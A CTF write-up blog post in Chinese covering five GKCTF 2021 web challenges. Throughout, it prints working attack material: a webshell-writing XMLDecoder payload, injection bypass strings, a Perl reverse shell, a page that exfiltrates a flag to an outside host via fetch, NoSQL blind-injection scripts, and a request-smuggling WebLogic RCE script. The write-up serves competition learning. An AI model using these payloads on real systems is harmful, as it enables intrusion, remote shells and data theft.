---
title: GKCTF 2021
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184384.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-10-26 21:20:28
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184159.jpg
---
# [GKCTF 2021]babycat
只能登录不能注册，看一下js

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023213736.png)

直接发包注册

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023213754.png)

upload功能admin only，但是还有个download，抓个包看看能不能任意读

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023214049.png)

然后不知道读啥了，java不熟，g。
查看wp可知路径是这样的/home/download?file=../../WEB-INF/classes/com/web/servlet/registerServlet.class

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023222602.png)

放到jd-gui里面

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023222847.png)

箭头1没用，看到替换下意识标了。箭头2匹配"role":"(.*?)"。
非贪婪匹配，只会匹配一次。
箭头3将匹配到的role强制转换为guest。

这里由于是json库，并且是gson进行解析，于是可以在 json中使用注释符/**/。
用注释符破坏正则的匹配：

	data={"username":"test3","password":"test","role":"admin","role"/**/:"admin"}


成功admin

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023230834.png)

我看到官方给的payload是

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023231010.png)

有点不是很理解为什么匹配的是最后一个。

读取uploadServlet.class

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023231737.png)

白名单后缀，并且ban了一些执行函数，这让本就不熟java的我原地去世。

## 非预期
然而这里并没有对错误上传的文件进行处理

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023232621.png)

尝试直接传shell

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023233437.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023233418.png)

## 预期

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211024144016.png)

其中 System.getenv("CATALINA_HOME") 可以使用前面的文件包含读取 /proc/self/environ 得到为 /usr/local/tomcat。因此可以尝试将 db.xml 覆盖为恶意代码后使用注册业务触发 XMLDecoder 反序列化。

网上找了执行的xml结构

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211024144825.png)

因为这里有过滤，所以换用hint中提到的 PrintWriter，也可以用实体编码绕过。

	<?xml version="1.0" encoding="utf-8"?>
	<java class="java.beans.XMLDecoder">
    	<object class="java.io.PrintWriter">
        	<string>/usr/local/tomcat/webapps/ROOT/static/shell.jsp</string>
        	<void method="println">
            	<string><![CDATA[冰蝎的载荷]]></string>
        	</void>
        	<void method="close"/>
    	</object>
	</java>

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211024150425.png)

注销登录触发

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211024150544.png)

# [GKCTF 2021]easycms
弱口令登陆后台，导出模板处存在任意文件下载。

还有一种解法，是在主题编辑界面处

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025153458.png)

但是提示

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025153510.png)

上传组件素材的地方通过修改名称可导致目录穿越创建文件至system目录，因为它的存储路径直接插在名称后面。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025154400.png)

在设计-高级那里改模板也是可以的。

# [GKCTF 2021]easynode

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025215948.png)

waf部分，将检测到的黑名单内的字符替换为*。
但是由于遍历的时候对比的是元素，所以可以用数组绕过。

js利用String和Array绕过一些限制 ：https://www.cnblogs.com/lzc-smiling/p/15161644.html

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025223859.png)

当然这篇文章说的并不完全正确，因为这里数组转为字符串靠的是加运算。（这也是后面payload最后加*的原因
最终username为

	["admin' #", '1', '2', '3', '4', '5', '6', '7', '8', '*']

payload

	username[]=admin' #&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=*&password=Troy3e

或者

	username[]=admin'#&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=a&username[]=*&username[]=a&password=Troy3e

*只要在单引号的位置之后即可。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025234101.png)

在adminDIV模块会读取用户的用户名，然后将DIV的键名和值直接导入进去。结合ejs的rce：https://xz.aliyun.com/t/6113

就可以getshell了。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211025234920.png)

获取 __proto__用户的 token ，用此 token 去POST data 数据污染

流程：获取admin token -> 添加用户 -> 导入DIV -> 渲染触发。

	perl -e 'use Socket;$i="x.x.x.x";$p=3333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026002209.png)

# [GKCTF 2021]CheckBot
bot本地访问admin.php获得flag。
根据index.php的提示，bot会访问我们post提交的url。那么也就是说构造一个页面让bot本地访问admin.php并带出flag即可。

	<html>
    	<body>
        	<iframe id="flag" src="http://127.0.0.1/admin.php"></iframe>
        	<script>
            	window.onload = function(){
                	/* Prepare flag */
                	let flag = document.getElementById("flag").contentWindow.document.getElementById("flag").innerHTML;
                	/* Export flag */
                	var exportFlag = new XMLHttpRequest();
                	exportFlag.open('get', 'http://x.x.x.x:3333/flagis-' + window.btoa(flag));
                	exportFlag.send();
            	}
        	</script>
    	</body>
	</html>

这个没打出，应该是xmlrequest的问题，换了下面那个

	<html>
    	<body>
        	<iframe id="iframe1" src="http://127.0.0.1/admin.php"></iframe>
        	<script>
	function load(){
	var iframe = document.getElementById("iframe1").contentWindow.document.getElementById("flag").innerHTML;
	console.log(iframe);
	fetch('http://xxx.xx.xxx.xx:5555', {method: 'POST', mode: 'no-cors', body: iframe})
	}

	window.onload = load;
	</script>
    	</body>
	</html>

fetch:https://www.jb51.net/html5/586989.html

# [GKCTF 2021]hackme

nosql注入：https://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/

根据提示nosql

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026223957.png)

经测试regexp、ne等被ban，用unicode绕过

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026225738.png)

盲注

	import requests
	import string
	import time

	flag = ""
	url = "http://node4.buuoj.cn:27064/login.php"

	while True:
    	for i in string.printable:
        	if i not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            	data = """{"username":"admin","password":{"\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078":"^%s"}}""" % (flag + i)
            	headers = {'Content-Type': 'application/json'}
            	r = requests.post(url=url,headers=headers,data=data)

            	if '登录了' in r.content.decode():
                	flag += i
                	print(flag)
                	time.sleep(0.2)

或

	import requests
	import string
	import time

	Troy3e = ['0', '1','2', '3','4', '5','6', '7','8','9','a','b','c ','d', 'e','f', 'g','h', 'i', 'j','k', 'l', 'm','n', 'o', 'p','q', 'r','s ' , 't', 'u ','v', 'w', 'x ', 'y' ,'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N', 'O','P', 'Q','R','S','T','U','V','W ','X ','Y','Z']
	flag = ""
	url = "http://node4.buuoj.cn:27064/login.php"

	while True:
    	for i in Troy3e:
        	data = """{"username":"admin","password":{"\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078":"^%s"}}""" % (flag + i)
        	headers = {'Content-Type': 'application/json'}
        	r = requests.post(url=url,headers=headers,data=data)

        	if '登录了' in r.content.decode():
            	flag += i
            	print(flag)
            	time.sleep(0.2)

42276606202db06ad1f29ab6b4a1307f
根据提示读nginx配置文件

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026232153.png)

	worker_processes  1;
	
	events {
    	worker_connections  1024;
	}


	http {
    	include       mime.types;
    	default_type  application/octet-stream;

    	sendfile        on;
    	#tcp_nopush     on;

    	#keepalive_timeout  0;
    	keepalive_timeout  65;

    	server {
        	listen       80;
        	error_page 404 404.php;
        	root /usr/local/nginx/html;
        	index index.htm index.html index.php;
        	location ~ \.php$ {
           	root           /usr/local/nginx/html;
           	fastcgi_pass   127.0.0.1:9000;
           	fastcgi_index  index.php;
           	fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
           	include        fastcgi_params;
        	}

    	}

	resolver 127.0.0.11 valid=0s ipv6=off;
	resolver_timeout 10s;


    	# weblogic
    	server {
			listen       80;
			server_name  weblogic;
			location / {
				proxy_set_header Host $host;
				set $backend weblogic;
				proxy_pass http://$backend:7001;
			}
		}
	}

fastcgi没有暴露在公网，没法未授权。内网有个weblogic。但是没法SSRF，这时注意到靶机的nginx版本

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026232937.png)

存在请求走私

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211026232951.png)

后面没复现成，直接拿了现成脚本打

	import socket

	sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sSocket.connect(("node4.buuoj.cn", 27064))
	payload = b'''HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n'''
	sSocket.send(payload)
	sSocket.settimeout(2)
	response = sSocket.recv(2147483647)
	while len(response) > 0:
    	print(response.decode())
    	try:
        	response = sSocket.recv(2147483647)
    	except:
        	break
	sSocket.close()


